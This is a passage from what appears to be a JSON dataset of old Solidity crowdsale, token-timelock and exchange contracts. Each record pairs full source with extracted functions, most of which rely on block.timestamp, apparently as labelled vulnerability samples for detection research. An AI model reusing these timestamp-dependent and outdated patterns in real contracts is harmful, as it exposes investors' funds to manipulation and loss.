[uint64(1543640395),uint64(1543640395),uint64(1543640395),uint64(1543640395),uint64(1543640395)];\n uint[5] memory weiRaisedAndTimeRates = [uint(300),uint(200),uint(150),uint(100),uint(50)];\n for (uint i = 0; i < 5; i++) {\n bool weiRaisedInBound = (weiRaisedStartsBoundaries[i] <= weiRaised) && (weiRaised < weiRaisedEndsBoundaries[i]);\n bool timeInBound = (timeStartsBoundaries[i] <= now) && (now < timeEndsBoundaries[i]);\n if (weiRaisedInBound && timeInBound) {\n bonusRate += bonusRate * weiRaisedAndTimeRates[i] / 1000;\n }\n }\n return bonusRate;\n }\n}\ncontract WhitelistedCrowdsale is Crowdsale, Ownable {\n mapping (address => bool) private whitelist;\n event WhitelistedAddressAdded(address indexed _address);\n event WhitelistedAddressRemoved(address indexed _address);\n modifier onlyIfWhitelisted(address _buyer) {\n require(whitelist[_buyer]);\n _;\n }\n function isWhitelisted(address _address) public view returns (bool) {\n return whitelist[_address];\n }\n function validPurchase() internal view onlyIfWhitelisted(msg.sender) returns (bool) {\n return super.validPurchase();\n }\n function addAddressToWhitelist(address _address) external onlyOwner {\n whitelist[_address] = true;\n emit WhitelistedAddressAdded(_address);\n }\n function addAddressesToWhitelist(address[] _addresses) external onlyOwner {\n for (uint i = 0; i < _addresses.length; i++) {\n whitelist[_addresses[i]] = true;\n emit WhitelistedAddressAdded(_addresses[i]);\n }\n }\n function removeAddressFromWhitelist(address _address) external onlyOwner {\n delete whitelist[_address];\n emit WhitelistedAddressRemoved(_address);\n }\n function removeAddressesFromWhitelist(address[] _addresses) external onlyOwner {\n for (uint i = 0; i < _addresses.length; i++) {\n delete whitelist[_addresses[i]];\n emit WhitelistedAddressRemoved(_addresses[i]);\n }\n }\n}\ncontract TemplateCrowdsale is Consts, MainCrowdsale\n , BonusableCrowdsale\n , CappedCrowdsale\n , WhitelistedCrowdsale\n{\n event Initialized();\n event TimesChanged(uint startTime, uint endTime, uint oldStartTime, uint oldEndTime);\n bool public initialized = false;\n function TemplateCrowdsale(MintableToken _token) public\n Crowdsale(START_TIME > now ? START_TIME : now, 1543640400, 1200 * TOKEN_DECIMAL_MULTIPLIER, 0x8BcC12F71e4C0C5f73C0dF9afbB3ed1de66DdD79)\n CappedCrowdsale(50000000000000000000000)\n {\n token = _token;\n }\n function init() public onlyOwner {\n require(!initialized);\n initialized = true;\n if (PAUSED) {\n MainToken(token).pause();\n }\n address[3] memory addresses = [address(0xbbc01d55a41a9eadd12027fe8088ed84768c3f0d),address(0x6cfd2db944e2b28a61a4f3f2cfb1973f0758cc3b),address(0x221be49cd399b8aaf0ade2485d6535e10518700d)];\n uint[3] memory amounts = [uint(12500000000000000000000000),uint(7500000000000000000000000),uint(20000000000000000000000000)];\n uint64[3] memory freezes = [uint64(0),uint64(0),uint64(1561953604)];\n for (uint i = 0; i < addresses.length; i++) {\n if (freezes[i] == 0) {\n MainToken(token).mint(addresses[i], amounts[i]);\n } else {\n MainToken(token).mintAndFreeze(addresses[i], amounts[i], freezes[i]);\n }\n }\n transferOwnership(TARGET_USER);\n emit Initialized();\n }\n function createTokenContract() internal returns (MintableToken) {\n return MintableToken(0);\n }\n function validPurchase() internal view returns (bool) {\n bool minValue = msg.value >= 100000000000000000;\n bool maxValue = msg.value <= 1000000000000000000000;\n return\n minValue &&\n maxValue &&\n super.validPurchase();\n }\n function hasEnded() public view returns (bool) {\n bool remainValue = cap.sub(weiRaised) < 100000000000000000;\n return super.hasEnded() || remainValue;\n }\n function setEndTime(uint _endTime) public onlyOwner {\n require(now < endTime);\n require(now < _endTime);\n require(_endTime > startTime);\n emit TimesChanged(startTime, _endTime, startTime, endTime);\n endTime = _endTime;\n }\n}",
  "extract_feature": [
    "function releaseOnce() public {\nbytes32 headKey = toKey(msg.sender, 0);\nuint64 head = chains[headKey];\nrequire(head != 0);\nrequire(uint64(block.timestamp) > head);\nbytes32 currentKey = toKey(msg.sender, head);\nuint64 next = chains[currentKey];\nuint amount = freezings[currentKey];\ndelete freezings[currentKey];\nbalances[msg.sender] = balances[msg.sender].add(amount);\nfreezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\nif (next == 0) {\ndelete chains[headKey];\n}\nelse {\nchains[headKey] = next;\ndelete chains[currentKey];\n}\nemit Released(msg.sender, amount);\n}",
    "function releaseAll() public returns (uint tokens) {\nuint release;\nuint balance;\n(release, balance) = getFreezing(msg.sender, 0);\nwhile (release != 0 && block.timestamp > release) {\nreleaseOnce();\ntokens += balance;\n(release, balance) = getFreezing(msg.sender, 0);\n}\n}",
    "function freeze(address _to, uint64 _until) internal {\nrequire(_until > block.timestamp);\nbytes32 key = toKey(_to, _until);\nbytes32 parentKey = toKey(_to, uint64(0));\nuint64 next = chains[parentKey];\nif (next == 0) {\nchains[parentKey] = _until;\nreturn;\n}\nbytes32 nextKey = toKey(_to, next);\nuint parent;\nwhile (next != 0 && _until > next) {\nparent = next;\nparentKey = nextKey;\nnext = chains[nextKey];\nnextKey = toKey(_to, next);\n}\nif (_until == next) {\nreturn;\n}\nif (next != 0) {\nchains[key] = next;\n}\nchains[parentKey] = _until;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f38"
  },
  "filename": "7464.sol",
  "content": "pragma solidity ^0.4.23;\ncontract BurnableTokenInterface {\n function burn(uint256 _value) public;\n}\ncontract GrapevineWhitelistInterface {\n function whitelist(address _address) view external returns (bool);\n function handleOffchainWhitelisted(address _addr, bytes _sig) external returns (bool);\n}\ncontract TokenTimelockControllerInterface {\n function activate() external;\n function createInvestorTokenTimeLock(\n address _beneficiary,\n uint256 _amount,\n uint256 _start,\n address _tokenHolder\n ) external returns (bool);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n ERC20 public token;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(\n address indexed purchaser,\n address indexed beneficiary,\n uint256 value,\n uint256 amount\n );\n constructor(uint256 _rate, address _wallet, ERC20 _token) public {\n require(_rate > 0);\n require(_wallet != address(0));\n require(_token != address(0));\n rate = _rate;\n wallet = _wallet;\n token = _token;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(\n msg.sender,\n _beneficiary,\n weiAmount,\n tokens\n );\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n require(_beneficiary != address(0));\n require(_weiAmount != 0);\n }\n function _postValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n }\n function _deliverTokens(\n address _beneficiary,\n uint256 _tokenAmount\n )\n internal\n {\n token.transfer(_beneficiary, _tokenAmount);\n }\n function _processPurchase(\n address _beneficiary,\n uint256 _tokenAmount\n )\n internal\n {\n _deliverTokens(_beneficiary, _tokenAmount);\n }\n function _updatePurchasingState(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n }\n function _getTokenAmount(uint256 _weiAmount)\n internal view returns (uint256)\n {\n return _weiAmount.mul(rate);\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract TimedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public openingTime;\n uint256 public closingTime;\n modifier onlyWhileOpen {\n require(block.timestamp >= openingTime && block.timestamp <= closingTime);\n _;\n }\n constructor(uint256 _openingTime, uint256 _closingTime) public {\n require(_openingTime >= block.timestamp);\n require(_closingTime >= _openingTime);\n openingTime = _openingTime;\n closingTime = _closingTime;\n }\n function hasClosed() public view returns (bool) {\n return block.timestamp > closingTime;\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n onlyWhileOpen\n {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract PostDeliveryCrowdsale is TimedCrowdsale {\n using SafeMath for uint256;\n mapping(address => uint256) public balances;\n function withdrawTokens() public {\n require(hasClosed());\n uint256 amount = balances[msg.sender];\n require(amount > 0);\n balances[msg.sender] = 0;\n _deliverTokens(msg.sender, amount);\n }\n function _processPurchase(\n address _beneficiary,\n uint256 _tokenAmount\n )\n internal\n {\n balances[_beneficiary] = balances[_beneficiary].add(_tokenAmount);\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract FinalizableCrowdsale is TimedCrowdsale, Ownable {\n using SafeMath for uint256;\n bool public isFinalized = false;\n event Finalized();\n function finalize() onlyOwner public {\n require(!isFinalized);\n require(hasClosed());\n finalization();\n emit Finalized();\n isFinalized = true;\n }\n function finalization() internal {\n }\n}\ncontract RefundVault is Ownable {\n using SafeMath for uint256;\n enum State { Active, Refunding, Closed }\n mapping (address => uint256) public deposited;\n address public wallet;\n State public state;\n event Closed();\n event RefundsEnabled();\n event Refunded(address indexed beneficiary, uint256 weiAmount);\n constructor(address _wallet) public {\n require(_wallet != address(0));\n wallet = _wallet;\n state = State.Active;\n }\n function deposit(address investor) onlyOwner public payable {\n require(state == State.Active);\n deposited[investor] = deposited[investor].add(msg.value);\n }\n function close() onlyOwner public {\n require(state == State.Active);\n state = State.Closed;\n emit Closed();\n wallet.transfer(address(this).balance);\n }\n function enableRefunds() onlyOwner public {\n require(state == State.Active);\n state = State.Refunding;\n emit RefundsEnabled();\n }\n function refund(address investor) public {\n require(state == State.Refunding);\n uint256 depositedValue = deposited[investor];\n deposited[investor] = 0;\n investor.transfer(depositedValue);\n emit Refunded(investor, depositedValue);\n }\n}\ncontract RefundableCrowdsale is FinalizableCrowdsale {\n using SafeMath for uint256;\n uint256 public goal;\n RefundVault public vault;\n constructor(uint256 _goal) public {\n require(_goal > 0);\n vault = new RefundVault(wallet);\n goal = _goal;\n }\n function claimRefund() public {\n require(isFinalized);\n require(!goalReached());\n vault.refund(msg.sender);\n }\n function goalReached() public view returns (bool) {\n return weiRaised >= goal;\n }\n function finalization() internal {\n if (goalReached()) {\n vault.close();\n } else {\n vault.enableRefunds();\n }\n super.finalization();\n }\n function _forwardFunds() internal {\n vault.deposit.value(msg.value)(msg.sender);\n }\n}\ncontract CappedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public cap;\n constructor(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function capReached() public view returns (bool) {\n return weiRaised >= cap;\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n require(weiRaised.add(_weiAmount) <= cap);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\ncontract GrapevineCrowdsale is CappedCrowdsale, TimedCrowdsale, Pausable, RefundableCrowdsale, PostDeliveryCrowdsale {\n using SafeMath for uint256;\n TokenTimelockControllerInterface public timelockController;\n GrapevineWhitelistInterface public authorisedInvestors;\n GrapevineWhitelistInterface public earlyInvestors;\n mapping(address => uint256) public bonuses;\n uint256 deliveryTime;\n uint256 tokensToBeDelivered;\n constructor(\n TokenTimelockControllerInterface _timelockController,\n GrapevineWhitelistInterface _authorisedInvestors,\n GrapevineWhitelistInterface _earlyInvestors,\n uint256 _rate,\n address _wallet,\n ERC20 _token,\n uint256 _openingTime,\n uint256 _closingTime,\n uint256 _softCap,\n uint256 _hardCap)\n Crowdsale(_rate, _wallet, _token)\n CappedCrowdsale(_hardCap)\n TimedCrowdsale(_openingTime, _closingTime)\n RefundableCrowdsale(_softCap)\n public\n {\n timelockController = _timelockController;\n authorisedInvestors = _authorisedInvestors;\n earlyInvestors = _earlyInvestors;\n deliveryTime = _closingTime.add(60*5);\n }\n function buyTokens(address _beneficiary, bytes _whitelistSign) public payable {\n if (!earlyInvestors.handleOffchainWhitelisted(_beneficiary, _whitelistSign)) {\n authorisedInvestors.handleOffchainWhitelisted(_beneficiary, _whitelistSign);\n }\n super.buyTokens(_beneficiary);\n }\n function withdrawTokens() public {\n require(goalReached());\n require(block.timestamp > deliveryTime);\n super.withdrawTokens();\n uint256 _bonusTokens = bonuses[msg.sender];\n if (_bonusTokens > 0) {\n bonuses[msg.sender] = 0;\n require(token.approve(address(timelockController), _bonusTokens));\n require(\n timelockController.createInvestorTokenTimeLock(\n msg.sender,\n _bonusTokens,\n deliveryTime,\n this\n )\n );\n }\n }\n function _processPurchase( address _beneficiary, uint256 _tokenAmount ) internal {\n uint256 _totalTokens = _tokenAmount;\n uint256 _bonus = getBonus(block.timestamp, _beneficiary, msg.value);\n if (_bonus>0) {\n uint256 _bonusTokens = _tokenAmount.mul(_bonus).div(100);\n uint256 _currentBalance = token.balanceOf(this);\n require(_currentBalance >= _totalTokens.add(_bonusTokens));\n bonuses[_beneficiary] = bonuses[_beneficiary].add(_bonusTokens);\n _totalTokens = _totalTokens.add(_bonusTokens);\n }\n tokensToBeDelivered = tokensToBeDelivered.add(_totalTokens);\n super._processPurchase(_beneficiary, _tokenAmount);\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal whenNotPaused {\n require(authorisedInvestors.whitelist(_beneficiary) || earlyInvestors.whitelist(_beneficiary));\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n function getBonus(uint256 _time, address _beneficiary, uint256 _value) view internal returns (uint256 _bonus) {\n _bonus = 0;\n if ( (weiRaised.sub(_value) < goal) && earlyInvestors.whitelist(_beneficiary) ) {\n _bonus = 30;\n } else {\n if (_time < openingTime.add(7 days)) {\n _bonus = 15;\n } else if (_time < openingTime.add(14 days)) {\n _bonus = 10;\n } else if (_time < openingTime.add(21 days)) {\n _bonus = 8;\n } else {\n _bonus = 6;\n }\n }\n return _bonus;\n }\n function finalization() internal {\n if (goalReached()) {\n timelockController.activate();\n uint256 balance = token.balanceOf(this);\n uint256 remainingTokens = balance.sub(tokensToBeDelivered);\n if (remainingTokens>0) {\n BurnableTokenInterface(address(token)).burn(remainingTokens);\n }\n }\n Ownable(address(token)).transferOwnership(owner);\n super.finalization();\n }\n}",
  "extract_feature": [
    "function hasClosed() public view returns (bool) {\nreturn block.timestamp > closingTime;\n}",
    "function withdrawTokens() public {\nrequire(goalReached());\nrequire(block.timestamp > deliveryTime);\nsuper.withdrawTokens();\nuint256 _bonusTokens = bonuses[msg.sender];\nif (_bonusTokens > 0) {\nbonuses[msg.sender] = 0;\nrequire(token.approve(address(timelockController), _bonusTokens));\nrequire(\ntimelockController.createInvestorTokenTimeLock(\nmsg.sender,\n_bonusTokens,\ndeliveryTime,\nthis\n)\n);\n}\n}",
    "function _processPurchase( address _beneficiary, uint256 _tokenAmount ) internal {\nuint256 _totalTokens = _tokenAmount;\nuint256 _bonus = getBonus(block.timestamp, _beneficiary, msg.value);\nif (_bonus>0) {\nuint256 _bonusTokens = _tokenAmount.mul(_bonus).div(100);\nuint256 _currentBalance = token.balanceOf(this);\nrequire(_currentBalance >= _totalTokens.add(_bonusTokens));\nbonuses[_beneficiary] = bonuses[_beneficiary].add(_bonusTokens);\n_totalTokens = _totalTokens.add(_bonusTokens);\n}\ntokensToBeDelivered = tokensToBeDelivered.add(_totalTokens);\nsuper._processPurchase(_beneficiary, _tokenAmount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f39"
  },
  "filename": "7466.sol",
  "content": "pragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract TokenTimelockController is Ownable {\n using SafeMath for uint;\n struct TokenTimelock {\n uint256 amount;\n uint256 releaseTime;\n bool released;\n bool revocable;\n bool revoked;\n }\n event TokenTimelockCreated(\n address indexed beneficiary,\n uint256 releaseTime,\n bool revocable,\n uint256 amount\n );\n event TokenTimelockRevoked(\n address indexed beneficiary\n );\n event TokenTimelockBeneficiaryChanged(\n address indexed previousBeneficiary,\n address indexed newBeneficiary\n );\n event TokenTimelockReleased(\n address indexed beneficiary,\n uint256 amount\n );\n uint256 public constant TEAM_LOCK_DURATION_PART1 = 1 * 365 days;\n uint256 public constant TEAM_LOCK_DURATION_PART2 = 2 * 365 days;\n uint256 public constant INVESTOR_LOCK_DURATION = 6 * 30 days;\n mapping (address => TokenTimelock[]) tokenTimeLocks;\n ERC20 public token;\n address public crowdsale;\n bool public activated;\n constructor(ERC20 _token) public {\n token = _token;\n }\n modifier onlyCrowdsale() {\n require(msg.sender == crowdsale);\n _;\n }\n modifier onlyWhenActivated() {\n require(activated);\n _;\n }\n modifier onlyValidTokenTimelock(address _beneficiary, uint256 _id) {\n require(_beneficiary != address(0));\n require(_id < tokenTimeLocks[_beneficiary].length);\n require(!tokenTimeLocks[_beneficiary][_id].revoked);\n _;\n }\n function setCrowdsale(address _crowdsale) external onlyOwner {\n require(_crowdsale != address(0));\n crowdsale = _crowdsale;\n }\n function activate() external onlyCrowdsale {\n activated = true;\n }\n function createInvestorTokenTimeLock(\n address _beneficiary,\n uint256 _amount,\n uint256 _start,\n address _tokenHolder\n ) external onlyCrowdsale returns (bool)\n {\n require(_beneficiary != address(0) && _amount > 0);\n require(_tokenHolder != address(0));\n TokenTimelock memory tokenLock = TokenTimelock(\n _amount,\n _start.add(INVESTOR_LOCK_DURATION),\n false,\n false,\n false\n );\n tokenTimeLocks[_beneficiary].push(tokenLock);\n require(token.transferFrom(_tokenHolder, this, _amount));\n emit TokenTimelockCreated(\n _beneficiary,\n tokenLock.releaseTime,\n false,\n _amount);\n return true;\n }\n function createTeamTokenTimeLock(\n address _beneficiary,\n uint256 _amount,\n uint256 _start,\n address _tokenHolder\n ) external onlyOwner returns (bool)\n {\n require(_beneficiary != address(0) && _amount > 0);\n require(_tokenHolder != address(0));\n uint256 amount = _amount.div(2);\n TokenTimelock memory tokenLock1 = TokenTimelock(\n amount,\n _start.add(TEAM_LOCK_DURATION_PART1),\n false,\n true,\n false\n );\n tokenTimeLocks[_beneficiary].push(tokenLock1);\n TokenTimelock memory tokenLock2 = TokenTimelock(\n amount,\n _start.add(TEAM_LOCK_DURATION_PART2),\n false,\n true,\n false\n );\n tokenTimeLocks[_beneficiary].push(tokenLock2);\n require(token.transferFrom(_tokenHolder, this, _amount));\n emit TokenTimelockCreated(\n _beneficiary,\n tokenLock1.releaseTime,\n true,\n amount);\n emit TokenTimelockCreated(\n _beneficiary,\n tokenLock2.releaseTime,\n true,\n amount);\n return true;\n }\n function revokeTokenTimelock(\n address _beneficiary,\n uint256 _id)\n external onlyWhenActivated onlyOwner onlyValidTokenTimelock(_beneficiary, _id)\n {\n require(tokenTimeLocks[_beneficiary][_id].revocable);\n require(!tokenTimeLocks[_beneficiary][_id].released);\n TokenTimelock storage tokenLock = tokenTimeLocks[_beneficiary][_id];\n tokenLock.revoked = true;\n require(token.transfer(owner, tokenLock.amount));\n emit TokenTimelockRevoked(_beneficiary);\n }\n function getTokenTimelockCount(address _beneficiary) view external returns (uint) {\n return tokenTimeLocks[_beneficiary].length;\n }\n function getTokenTimelockDetails(address _beneficiary, uint256 _id) view external returns (\n uint256 _amount,\n uint256 _releaseTime,\n bool _released,\n bool _revocable,\n bool _revoked)\n {\n require(_id < tokenTimeLocks[_beneficiary].length);\n _amount = tokenTimeLocks[_beneficiary][_id].amount;\n _releaseTime = tokenTimeLocks[_beneficiary][_id].releaseTime;\n _released = tokenTimeLocks[_beneficiary][_id].released;\n _revocable = tokenTimeLocks[_beneficiary][_id].revocable;\n _revoked = tokenTimeLocks[_beneficiary][_id].revoked;\n }\n function changeBeneficiary(uint256 _id, address _newBeneficiary) external onlyWhenActivated onlyValidTokenTimelock(msg.sender, _id) {\n tokenTimeLocks[_newBeneficiary].push(tokenTimeLocks[msg.sender][_id]);\n if (tokenTimeLocks[msg.sender].length > 1) {\n tokenTimeLocks[msg.sender][_id] = tokenTimeLocks[msg.sender][tokenTimeLocks[msg.sender].length.sub(1)];\n delete(tokenTimeLocks[msg.sender][tokenTimeLocks[msg.sender].length.sub(1)]);\n }\n tokenTimeLocks[msg.sender].length--;\n emit TokenTimelockBeneficiaryChanged(msg.sender, _newBeneficiary);\n }\n function release(uint256 _id) external {\n releaseFor(msg.sender, _id);\n }\n function releaseFor(address _beneficiary, uint256 _id) public onlyWhenActivated onlyValidTokenTimelock(_beneficiary, _id) {\n TokenTimelock storage tokenLock = tokenTimeLocks[_beneficiary][_id];\n require(!tokenLock.released);\n require(block.timestamp >= tokenLock.releaseTime);\n tokenLock.released = true;\n require(token.transfer(_beneficiary, tokenLock.amount));\n emit TokenTimelockReleased(_beneficiary, tokenLock.amount);\n }\n}",
  "extract_feature": [
    "function releaseFor(address _beneficiary, uint256 _id) public onlyWhenActivated onlyValidTokenTimelock(_beneficiary, _id) {\nTokenTimelock storage tokenLock = tokenTimeLocks[_beneficiary][_id];\nrequire(!tokenLock.released);\nrequire(block.timestamp >= tokenLock.releaseTime);\ntokenLock.released = true;\nrequire(token.transfer(_beneficiary, tokenLock.amount));\nemit TokenTimelockReleased(_beneficiary, tokenLock.amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f3a"
  },
  "filename": "7511.sol",
  "content": "pragma solidity ^0.4.20;\ncontract SafeMath {\n function safeAdd(uint256 _x, uint256 _y) internal pure returns (uint256) {\n uint256 z = _x + _y;\n assert(z >= _x);\n return z;\n }\n function safeSub(uint256 _x, uint256 _y) internal pure returns (uint256) {\n assert(_x >= _y);\n return _x - _y;\n }\n function safeMul(uint256 _x, uint256 _y) internal pure returns (uint256) {\n uint256 z = _x * _y;\n assert(_x == 0 || z / _x == _y);\n return z;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract R1Exchange is SafeMath, Ownable {\n mapping(address => bool) public admins;\n mapping(address => bool) public feeAccounts;\n bool public withdrawEnabled = false;\n mapping(address => mapping(address => uint256)) public tokenList;\n mapping(address => mapping(bytes32 => uint256)) public orderFilled;\n mapping(bytes32 => bool) public withdrawn;\n mapping(address => mapping(address => uint256)) public withdrawAllowance;\n mapping(address => mapping(address => uint256)) public applyList;\n mapping(address => mapping(address => uint)) public latestApply;\n uint public applyWait = 7 days;\n uint public feeRate = 1;\n event Deposit(address indexed token, address indexed user, uint256 amount, uint256 balance);\n event Withdraw(address indexed token, address indexed user, uint256 amount, uint256 balance);\n event ApplyWithdraw(address indexed token, address indexed user, uint256 amount, uint256 time);\n modifier onlyAdmin {\n require(admins[msg.sender]);\n _;\n }\n modifier isWithdrawEnabled {\n require(withdrawEnabled);\n _;\n }\n modifier isFeeAccount(address fa) {\n require(feeAccounts[fa]);\n _;\n }\n function() public {\n revert();\n }\n function setAdmin(address admin, bool isAdmin) public onlyOwner {\n require(admin != 0);\n admins[admin] = isAdmin;\n }\n function setFeeAccount(address acc, bool asFee) public onlyOwner {\n require(acc != 0);\n feeAccounts[acc] = asFee;\n }\n function enableWithdraw(bool enabled) public onlyOwner {\n withdrawEnabled = enabled;\n }\n function changeLockTime(uint lock) public onlyOwner {\n require(lock <= 7 days);\n applyWait = lock;\n }\n function changeFeeRate(uint fr) public onlyOwner {\n require(fr > 0);\n feeRate = fr;\n }\n function deposit() public payable {\n tokenList[0][msg.sender] = safeAdd(tokenList[0][msg.sender], msg.value);\n Deposit(0, msg.sender, msg.value, tokenList[0][msg.sender]);\n }\n function depositToken(address token, uint256 amount) public {\n require(token != 0);\n tokenList[token][msg.sender] = safeAdd(tokenList[token][msg.sender], amount);\n require(Token(token).transferFrom(msg.sender, this, amount));\n Deposit(token, msg.sender, amount, tokenList[token][msg.sender]);\n }\n function applyWithdraw(address token, uint256 amount) public {\n uint256 apply = safeAdd(applyList[token][msg.sender], amount);\n require(safeAdd(apply, withdrawAllowance[token][msg.sender]) <= tokenList[token][msg.sender]);\n applyList[token][msg.sender] = apply;\n latestApply[token][msg.sender] = block.timestamp;\n ApplyWithdraw(token, msg.sender, amount, block.timestamp);\n }\n function approveWithdraw(address token, address user) public onlyAdmin {\n withdrawAllowance[token][user] = safeAdd(withdrawAllowance[token][user], applyList[token][user]);\n applyList[token][user] = 0;\n latestApply[token][user] = 0;\n }\n function withdraw(address token, uint256 amount) public {\n require(amount <= tokenList[token][msg.sender]);\n if (amount > withdrawAllowance[token][msg.sender]) {\n require(latestApply[token][msg.sender] != 0 && safeSub(block.timestamp, latestApply[token][msg.sender]) > applyWait);\n withdrawAllowance[token][msg.sender] = safeAdd(withdrawAllowance[token][msg.sender], applyList[token][msg.sender]);\n applyList[token][msg.sender] = 0;\n }\n require(amount <= withdrawAllowance[token][msg.sender]);\n withdrawAllowance[token][msg.sender] = safeSub(withdrawAllowance[token][msg.sender], amount);\n tokenList[token][msg.sender] = safeSub(tokenList[token][msg.sender], amount);\n latestApply[token][msg.sender] = 0;\n if (token == 0) {\n require(msg.sender.send(amount));\n } else {\n require(Token(token).transfer(msg.sender, amount));\n }\n Withdraw(token, msg.sender, amount, tokenList[token][msg.sender]);\n }\n function withdrawNoLimit(address token, uint256 amount) public isWithdrawEnabled {\n require(amount <= tokenList[token][msg.sender]);\n tokenList[token][msg.sender] = safeSub(tokenList[token][msg.sender], amount);\n if (token == 0) {\n require(msg.sender.send(amount));\n } else {\n require(Token(token).transfer(msg.sender, amount));\n }\n Withdraw(token, msg.sender, amount, tokenList[token][msg.sender]);\n }\n function adminWithdraw(address[3] addresses, uint256[3] values, uint8 v, bytes32 r, bytes32 s)\n public\n onlyAdmin\n isFeeAccount(addresses[2])\n {\n address user = addresses[0];\n address token = addresses[1];\n address feeAccount = addresses[2];\n uint256 amount = values[0];\n uint256 nonce = values[1];\n uint256 fee = 